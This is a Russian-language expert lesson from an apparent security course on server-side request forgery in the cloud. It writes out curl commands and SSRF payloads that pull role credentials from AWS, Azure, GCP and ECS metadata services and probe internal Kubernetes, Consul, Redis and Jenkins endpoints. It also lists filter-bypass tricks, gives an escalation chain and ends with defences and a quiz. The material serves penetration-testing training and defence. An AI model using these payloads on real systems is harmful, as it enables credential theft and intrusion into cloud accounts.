---
id: cloud-ssrf-cloud-deep
title: "SSRF глубоко: от внутренних API к облачным ролям"
category: cloud
parent: cloud-cross-deep
difficulty: expert
order: 3
tags: [cloud, ssrf, imds, metadata, internal, rce, aws, azure, gcp]
prerequisites: [cloud-cross-deep, cloud-ssrf-to-cloud]
useful_for:
  - "Эксплуатация SSRF в облаке"
  - "Захват ролей через metadata"
  - "Пивот к внутренним сервисам"
estimated_minutes: 50
summary: "SSRF глубоко: IMDSv1/v2, GCP/Azure metadata, внутренние API, обход фильтров и переход от SSRF к облачным ролям. Практические цепочки для AWS, Azure и GCP."
---

## Зачем этот урок

SSRF — один из самых мощных векторов в облаке: он превращает веб-уязвимость в кражу облачных кредов. Через metadata-сервис приложение отдаёт токены своей роли, а через внутренние API — доступ к другим сервисам. Этот урок — про глубокую эксплуатацию: обход фильтров, IMDSv2, различия провайдеров и построение цепочки от SSRF до полного контроля роли.

## Модель SSRF в облаке

- **IMDS AWS** — `http://169.254.169.254/latest/meta-data/` (IMDSv1), `.../api/token` (IMDSv2). Отдаёт креды роли инстанса.
- **IMDS Azure** — `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=...` с заголовком `Metadata: true`.
- **Metadata GCP** — `http://metadata.google.internal/computeMetadata/v1/...` с заголовком `Metadata-Flavor: Google`.
- **Внутренние API** — Kubernetes API, Consul, etcd, внутренние админки, базы.
- **Контейнерные metadata** — ECS (`169.254.170.2`), GKE metadata server, AKS.

## Инструменты и команды

```bash
# AWS IMDSv1 (SSRF)
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole"

# AWS IMDSv2 (нужен PUT для токена)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Azure (нужен заголовок Metadata: true)
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# GCP (нужен Metadata-Flavor: Google)
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# ECS
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
```

## Разобранный пример: SSRF → AWS-роль → эскалация

Сценарий: веб-приложение на EC2 принимает URL и делает запрос (SSRF).

```bash
# 1. Проверяем IMDS
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# web-role

GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role
# {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}

# 2. Используем креды
export AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity
# {"Arn":"arn:aws:sts::111122223333:assumed-role/web-role/i-0abc"}

# 3. Перечисляем права
aws iam list-attached-role-policies --role-name web-role
aws s3 ls
aws secretsmanager list-secrets
```

Роль `web-role` часто имеет доступ к S3/Secrets Manager/DynamoDB. Дальше — расширяем: если есть `iam:PassRole` + `lambda:CreateFunction`, создаём Lambda с более привилегированной ролью.

## Обход фильтров SSRF

- **IP-обход**: `169.254.169.254` → decimal (`2852039166`), octal, hex, IPv6-mapped (`::ffff:169.254.169.254`), `[::]`.
- **DNS rebinding**: домен резолвится сначала в разрешённый IP, потом в metadata.
- **Redirect**: ваш URL отдаёт 302 на metadata.
- **URL parser tricks**: `http://169.254.169.254@allowed.com`, `http://allowed.com#@169.254.169.254`.
- **Whitelist bypass**: `allowed.com.169.254.169.254.nip.io`.
- **IMDSv2**: если включён, нужен PUT-токен; SSRF должен уметь PUT. Иногда приложение поддерживает только GET — тогда IMDSv2 спасает.

## Различия провайдеров

| Провайдер | Эндпоинт | Заголовок/метод |
|---|---|---|
| AWS IMDSv1 | 169.254.169.254 | GET |
| AWS IMDSv2 | 169.254.169.254 | PUT (token), затем GET |
| Azure | 169.254.169.254 | `Metadata: true` |
| GCP | metadata.google.internal | `Metadata-Flavor: Google` |
| ECS | 169.254.170.2 | GET |
| GKE | metadata.google.internal | `Metadata-Flavor: Google` |

## Чек-лист атаки

1. Проверить, есть ли SSRF (в URL, webhook, import, image proxy).
2. Проверить доступ к metadata (IMDSv1/v2, Azure, GCP).
3. Получить токен роли.
4. Перечислить права и данные.
5. Проверить внутренние API (k8s, Consul, etcd, админки).
6. Проверить ECS/GKE metadata.
7. Построить цепочку (PassRole → Lambda, SSRF → Key Vault).

## Обход защит и edge cases

- **IMDSv2 hop limit.** Ограничивает TTL пакета; из контейнера/прокси запрос может не дойти. Проверяйте.
- **Metadata concealment.** В k8s поды могут идти через прокси; GKE metadata server выдаёт токен KSA.
- **Network policy.** Может блокировать egress, но link-local metadata обычно доступен.
- **WAF.** Может блокировать паттерны `169.254`; используйте обходы.
- **Только allowlist.** DNS rebinding и redirect помогают.
- **No egress.** Если приложение не имеет выхода в интернет, но имеет доступ к metadata — SSRF всё равно работает.

## Частые ошибки и подводные камни

- Считать, что IMDSv2 полностью защищает: SSRF с поддержкой PUT обходит.
- Не проверить decimal/hex-обходы фильтров.
- Игнорировать внутренние API (k8s, Consul).
- Забыть про ECS/GKE metadata.
- Не учитывать hop limit.

## Защита и детект

- Включить IMDSv2 (обязательно) и hop limit = 1.
- Ограничить исходящие запросы приложения (allowlist, egress proxy).
- Не доверять пользовательскому URL; валидировать и запрещать внутренние адреса.
- Использовать отдельные роли с минимальными правами для веб-приложений.
- Мониторить обращения к metadata (VPC flow, GuardDuty).

## Модель угроз и типовые мисконфиги

Типичный мисконфиг — IMDSv1. Второй — SSRF без валидации URL. Третий — широкая роль веб-приложения. Четвёртый — доступ к внутренним API. Пятый — hop limit > 1. Все ведут к краже ролей.

## Практическое задание

1. Создайте EC2 с ролью и веб-приложением с SSRF; получите креды через metadata.
2. Включите IMDSv2 и проверьте, что GET без токена не работает.
3. Настройте hop limit = 1 и проверьте, что из контейнера metadata недоступен.
4. Протестируйте decimal/hex-обходы фильтра.

## Что дальше / решение

Из SSRF получаем облачные креды. Дальше — перечислять права и эскалировать. Зафиксируйте путь «SSRF → metadata → роль» в графе. Если IMDSv2 + hop limit + нет egress — `blocked`, ищите другой вектор.

## Разобранный пример 2: SSRF → ECS/K8s и внутренние API

Не только EC2 имеет metadata. ECS-задачи получают креды через `169.254.170.2`, а поды GKE — через metadata-сервер.

```bash
# ECS: переменная окружения указывает путь
# AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/abc-123
curl "http://169.254.170.2/v2/credentials/abc-123"
# {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","RoleArn":"arn:aws:iam::...:role/task-role"}

# GKE/AKS: metadata пода
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Внутренние API через SSRF
GET /fetch?url=http://kubernetes.default.svc/api/v1/namespaces/default/pods
GET /fetch?url=http://consul.service:8500/v1/kv/?recurse
GET /fetch?url=http://etcd:2379/v2/keys/
```

SSRF к Kubernetes API может дать доступ к подам/секретам, если у приложения есть service account с правами. SSRF к Consul/etcd — конфигурации и секреты. Проверяйте внутренние DNS-имена (`*.svc.cluster.local`, `kubernetes.default.svc`) и порты (2379, 8500, 10250). Часто SSRF позволяет не только читать, но и делать POST (создать под, изменить конфиг).

## SSRF к внутренним сервисам и базам

Помимо metadata, SSRF открывает внутренние сервисы, которые не должны быть доступны извне.

```bash
# Внутренние базы
GET /fetch?url=http://redis.internal:6379/       # HTTP к Redis может дать RCE/данные
GET /fetch?url=http://postgres.internal:5432/
GET /fetch?url=http://elastic.internal:9200/_cat/indices

# Панели управления
GET /fetch?url=http://jenkins.internal:8080/script
GET /fetch?url=http://consul.internal:8500/v1/agent/self
GET /fetch?url=http://metadata.internal/latest/user-data

# Cloud metadata через прокси-сервисы
GET /fetch?url=http://169.254.169.254/latest/meta-data/
```

Внутренние сервисы часто не имеют аутентификации, потому что «доступны только изнутри». SSRF обходит это предположение. Особенно опасны: Redis (запись в RCE через модули/конфиг), Elasticsearch (данные), Jenkins (script console → RCE), Consul (KV-секреты). Проверяйте также `user-data` — иногда там лежат bootstrap-скрипты с паролями. SSRF с поддержкой методов (PUT/POST) позволяет не только читать, но и изменять.

## Внутренний DNS и карта сервисов

SSRF полезно направить на разведку внутренней сети: узнайте DNS-имена и порты.

```bash
# Kubernetes DNS
GET /fetch?url=http://kubernetes.default.svc/api/v1/namespaces
GET /fetch?url=http://<svc>.<ns>.svc.cluster.local:PORT/

# Cloud-специфичные внутренние адреса
GET /fetch?url=http://169.254.169.254/latest/meta-data/local-ipv4
GET /fetch?url=http://instance-data/latest/meta-data/        # AWS alias

# Проверка открытых портов через ошибки/таймауты
GET /fetch?url=http://10.0.0.5:6379/
GET /fetch?url=http://10.0.0.6:9200/
```

Часто SSRF возвращает разный ответ/ошибку в зависимости от доступности порта, что позволяет картографировать сеть. Ищите внутренние админки, базы, очереди. Помните, что SSRF может быть ограничен allowlist — тогда используйте DNS rebinding или открытый redirect. Составьте карту внутренних сервисов: это основа для дальнейшего пивота.

## Квиз

```quiz
- question: "Что нужно для запроса к AWS IMDSv2?"
  options:
    - "Сначала PUT-запрос за токеном, затем GET с заголовком токена"
    - "Только GET"
    - "Заголовок Metadata: true"
    - "Metadata-Flavor: Google"
  answer: 0
  explanation: "IMDSv2 требует session token через PUT."
- question: "Какой заголовок нужен для Azure IMDS?"
  options:
    - "Metadata: true"
    - "Metadata-Flavor: Google"
    - "X-aws-ec2-metadata-token"
    - "Authorization"
  answer: 0
  explanation: "Azure IMDS требует Metadata: true."
- question: "Зачем нужен hop limit = 1?"
  options:
    - "Ограничивает доступ к metadata из контейнеров/прокси"
    - "Ускоряет сеть"
    - "Шифрует metadata"
    - "Включает IMDSv2"
  answer: 0
  explanation: "hop limit 1 не даёт запросу пройти дальше инстанса."
- question: "Как обойти фильтр по строке 169.254.169.254?"
  options:
    - "Decimal/hex-форма адреса, DNS rebinding, redirect"
    - "Использовать HTTPS"
    - "Добавить слеш"
    - "Сменить регион"
  answer: 0
  explanation: "Разные представления IP и перенаправления обходят наивные фильтры."
```

## Где пригодится

- **Bug bounty:** SSRF в облачных приложениях.
- **Red team:** захват ролей через metadata.
- **Пентест cloud:** цепочки от веб-уязвимости.
- **Blue team:** включение IMDSv2 и egress-контроль.
